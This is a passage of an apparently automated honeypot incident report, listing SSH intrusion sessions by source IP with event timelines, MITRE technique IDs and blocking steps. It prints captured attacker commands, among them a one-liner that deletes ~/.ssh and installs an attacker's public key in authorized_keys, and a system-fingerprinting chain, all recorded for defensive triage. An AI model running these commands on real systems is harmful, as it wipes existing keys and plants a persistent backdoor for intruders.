| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:42:04` | `cowrie.session.connect` |
| `2026-06-30 13:42:04` | `cowrie.client.version` |
| `2026-06-30 13:42:04` | `cowrie.client.kex` |
| `2026-06-30 13:42:04` | `cowrie.login.success` |
| `2026-06-30 13:42:05` | `cowrie.session.params` |
| `2026-06-30 13:42:05` | `cowrie.command.input` |
| `2026-06-30 13:42:05` | `cowrie.command.failed` |
| `2026-06-30 13:42:05` | `cowrie.log.closed` |
| `2026-06-30 13:42:06` | `cowrie.session.params` |
| `2026-06-30 13:42:06` | `cowrie.command.input` |
| `2026-06-30 13:42:06` | `cowrie.session.file_download` |
| `2026-06-30 13:42:06` | `cowrie.log.closed` |
| `2026-06-30 13:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.112.56[.]47` to AbuseIPDB if not already reported
- [ ] Block `134.112.56[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-244d77f4817c

| Field | Detail |
|---|---|
| **Source IP** | `134.112.56[.]47` |
| **First Seen** | 2026-06-30 13:42 |
| **Last Seen** | 2026-06-30 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:42:06` | `cowrie.session.connect` |
| `2026-06-30 13:42:06` | `cowrie.client.version` |
| `2026-06-30 13:42:06` | `cowrie.client.kex` |
| `2026-06-30 13:42:07` | `cowrie.login.success` |
| `2026-06-30 13:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.112.56[.]47` to AbuseIPDB if not already reported
- [ ] Block `134.112.56[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a61710e0166

| Field | Detail |
|---|---|
| **Source IP** | `134.112.56[.]47` |
| **First Seen** | 2026-06-30 13:42 |
| **Last Seen** | 2026-06-30 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:42:07` | `cowrie.session.connect` |
| `2026-06-30 13:42:07` | `cowrie.client.version` |
| `2026-06-30 13:42:07` | `cowrie.client.kex` |
| `2026-06-30 13:42:08` | `cowrie.login.success` |
| `2026-06-30 13:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.112.56[.]47` to AbuseIPDB if not already reported
- [ ] Block `134.112.56[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d308fdbb7d33

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-06-30 13:44 |
| **Last Seen** | 2026-06-30 13:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:44:13` | `cowrie.session.connect` |
| `2026-06-30 13:44:13` | `cowrie.client.version` |
| `2026-06-30 13:44:13` | `cowrie.client.kex` |
| `2026-06-30 13:44:13` | `cowrie.login.success` |
| `2026-06-30 13:44:14` | `cowrie.session.params` |
| `2026-06-30 13:44:14` | `cowrie.command.input` |
| `2026-06-30 13:44:14` | `cowrie.command.failed` |
| `2026-06-30 13:44:14` | `cowrie.log.closed` |
| `2026-06-30 13:44:14` | `cowrie.session.params` |
| `2026-06-30 13:44:14` | `cowrie.command.input` |
| `2026-06-30 13:44:15` | `cowrie.session.file_download` |
| `2026-06-30 13:44:15` | `cowrie.log.closed` |
| `2026-06-30 13:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d385bb61f5a

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-06-30 13:44 |
| **Last Seen** | 2026-06-30 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:44:15` | `cowrie.session.connect` |
| `2026-06-30 13:44:15` | `cowrie.client.version` |
| `2026-06-30 13:44:15` | `cowrie.client.kex` |
| `2026-06-30 13:44:15` | `cowrie.login.success` |
| `2026-06-30 13:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-923d075cd5b5

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-06-30 13:44 |
| **Last Seen** | 2026-06-30 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:44:15` | `cowrie.session.connect` |
| `2026-06-30 13:44:15` | `cowrie.client.version` |
| `2026-06-30 13:44:15` | `cowrie.client.kex` |
| `2026-06-30 13:44:16` | `cowrie.login.success` |
| `2026-06-30 13:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0625335e4370

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 13:45 |
| **Last Seen** | 2026-06-30 13:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:45:50` | `cowrie.session.connect` |
| `2026-06-30 13:45:52` | `cowrie.client.version` |
| `2026-06-30 13:45:52` | `cowrie.client.kex` |
| `2026-06-30 13:45:57` | `cowrie.login.success` |
| `2026-06-30 13:46:01` | `cowrie.session.params` |
| `2026-06-30 13:46:01` | `cowrie.command.input` |
| `2026-06-30 13:46:02` | `cowrie.log.closed` |
| `2026-06-30 13:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cda6feb3daf8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:46 |
| **Last Seen** | 2026-06-30 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:46:39` | `cowrie.session.connect` |
| `2026-06-30 13:46:39` | `cowrie.client.version` |
| `2026-06-30 13:46:39` | `cowrie.client.kex` |
| `2026-06-30 13:46:39` | `cowrie.login.success` |
| `2026-06-30 13:46:40` | `cowrie.session.params` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.success` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.command.input` |
| `2026-06-30 13:46:40` | `cowrie.log.closed` |
| `2026-06-30 13:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c03f76059e

| Field | Detail |
|---|---|
| **Source IP** | `104.155.77[.]148` |
| **First Seen** | 2026-06-30 13:47 |
| **Last Seen** | 2026-06-30 13:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:47:12` | `cowrie.session.connect` |
| `2026-06-30 13:47:12` | `cowrie.client.version` |
| `2026-06-30 13:47:12` | `cowrie.client.kex` |
| `2026-06-30 13:47:14` | `cowrie.login.success` |
| `2026-06-30 13:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.77[.]148` to AbuseIPDB if not already reported
- [ ] Block `104.155.77[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a20e3e656729

| Field | Detail |
|---|---|
| **Source IP** | `14.224.227[.]189` |
| **First Seen** | 2026-06-30 13:47 |
| **Last Seen** | 2026-06-30 13:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:47:46` | `cowrie.session.connect` |
| `2026-06-30 13:47:46` | `cowrie.client.version` |
| `2026-06-30 13:47:47` | `cowrie.client.kex` |
| `2026-06-30 13:47:48` | `cowrie.login.success` |
| `2026-06-30 13:47:49` | `cowrie.session.params` |
| `2026-06-30 13:47:49` | `cowrie.command.input` |
| `2026-06-30 13:47:49` | `cowrie.command.failed` |
| `2026-06-30 13:47:49` | `cowrie.log.closed` |
| `2026-06-30 13:47:50` | `cowrie.session.params` |
| `2026-06-30 13:47:50` | `cowrie.command.input` |
| `2026-06-30 13:47:50` | `cowrie.session.file_download` |
| `2026-06-30 13:47:50` | `cowrie.log.closed` |
| `2026-06-30 13:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.227[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.224.227[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00ebc43e797

| Field | Detail |
|---|---|
| **Source IP** | `14.224.227[.]189` |
| **First Seen** | 2026-06-30 13:47 |
| **Last Seen** | 2026-06-30 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:47:51` | `cowrie.session.connect` |
| `2026-06-30 13:47:51` | `cowrie.client.version` |
| `2026-06-30 13:47:51` | `cowrie.client.kex` |
| `2026-06-30 13:47:52` | `cowrie.login.success` |
| `2026-06-30 13:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.227[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.224.227[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-355105f0caef

| Field | Detail |
|---|---|
| **Source IP** | `14.224.227[.]189` |
| **First Seen** | 2026-06-30 13:47 |
| **Last Seen** | 2026-06-30 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:47:52` | `cowrie.session.connect` |
| `2026-06-30 13:47:52` | `cowrie.client.version` |
| `2026-06-30 13:47:53` | `cowrie.client.kex` |
| `2026-06-30 13:47:53` | `cowrie.login.success` |
| `2026-06-30 13:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.227[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.224.227[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46bf9091f11b

| Field | Detail |
|---|---|
| **Source IP** | `120.48.26[.]185` |
| **First Seen** | 2026-06-30 13:47 |
| **Last Seen** | 2026-06-30 13:52 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:47:53` | `cowrie.session.connect` |
| `2026-06-30 13:47:53` | `cowrie.client.version` |
| `2026-06-30 13:47:54` | `cowrie.client.kex` |
| `2026-06-30 13:47:55` | `cowrie.login.success` |
| `2026-06-30 13:47:56` | `cowrie.session.params` |
| `2026-06-30 13:47:56` | `cowrie.command.input` |
| `2026-06-30 13:47:56` | `cowrie.command.failed` |
| `2026-06-30 13:47:57` | `cowrie.log.closed` |
| `2026-06-30 13:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.26[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.48.26[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62477e40393c

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-30 13:49 |
| **Last Seen** | 2026-06-30 13:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:49:21` | `cowrie.session.connect` |
| `2026-06-30 13:49:21` | `cowrie.client.version` |
| `2026-06-30 13:49:22` | `cowrie.client.kex` |
| `2026-06-30 13:49:22` | `cowrie.login.success` |
| `2026-06-30 13:49:23` | `cowrie.session.params` |
| `2026-06-30 13:49:23` | `cowrie.command.input` |
| `2026-06-30 13:49:23` | `cowrie.command.failed` |
| `2026-06-30 13:49:24` | `cowrie.log.closed` |
| `2026-06-30 13:49:25` | `cowrie.session.params` |
| `2026-06-30 13:49:25` | `cowrie.command.input` |
| `2026-06-30 13:49:25` | `cowrie.session.file_download` |
| `2026-06-30 13:49:25` | `cowrie.log.closed` |
| `2026-06-30 13:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f77f3eb4da

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-30 13:49 |
| **Last Seen** | 2026-06-30 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:49:25` | `cowrie.session.connect` |
| `2026-06-30 13:49:25` | `cowrie.client.version` |
| `2026-06-30 13:49:25` | `cowrie.client.kex` |
| `2026-06-30 13:49:26` | `cowrie.login.success` |
| `2026-06-30 13:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d37f50fc892

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-30 13:49 |
| **Last Seen** | 2026-06-30 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:49:27` | `cowrie.session.connect` |
| `2026-06-30 13:49:27` | `cowrie.client.version` |
| `2026-06-30 13:49:27` | `cowrie.client.kex` |
| `2026-06-30 13:49:28` | `cowrie.login.success` |
| `2026-06-30 13:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e38f5c2374

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:52 |
| **Last Seen** | 2026-06-30 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:52:48` | `cowrie.session.connect` |
| `2026-06-30 13:52:48` | `cowrie.client.version` |
| `2026-06-30 13:52:48` | `cowrie.client.kex` |
| `2026-06-30 13:52:48` | `cowrie.login.success` |
| `2026-06-30 13:52:49` | `cowrie.session.params` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.success` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.command.input` |
| `2026-06-30 13:52:49` | `cowrie.log.closed` |
| `2026-06-30 13:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074b479f5b7e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 13:57 |
| **Last Seen** | 2026-06-30 13:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:57:22` | `cowrie.session.connect` |
| `2026-06-30 13:57:23` | `cowrie.client.version` |
| `2026-06-30 13:57:23` | `cowrie.client.kex` |
| `2026-06-30 13:57:30` | `cowrie.login.success` |
| `2026-06-30 13:57:33` | `cowrie.session.params` |
| `2026-06-30 13:57:33` | `cowrie.command.input` |
| `2026-06-30 13:57:35` | `cowrie.log.closed` |
| `2026-06-30 13:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1362ed48e718

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 13:57 |
| **Last Seen** | 2026-06-30 13:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:57:37` | `cowrie.session.connect` |
| `2026-06-30 13:57:37` | `cowrie.client.version` |
| `2026-06-30 13:57:37` | `cowrie.client.kex` |
| `2026-06-30 13:57:39` | `cowrie.login.success` |
| `2026-06-30 13:57:41` | `cowrie.session.params` |
| `2026-06-30 13:57:41` | `cowrie.command.input` |
| `2026-06-30 13:57:41` | `cowrie.log.closed` |
| `2026-06-30 13:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49028c161f52

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:59 |
| **Last Seen** | 2026-06-30 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:59:30` | `cowrie.session.connect` |
| `2026-06-30 13:59:30` | `cowrie.client.version` |
| `2026-06-30 13:59:30` | `cowrie.client.kex` |
| `2026-06-30 13:59:31` | `cowrie.login.success` |
| `2026-06-30 13:59:32` | `cowrie.session.params` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.input` |
| `2026-06-30 13:59:32` | `cowrie.command.success` |
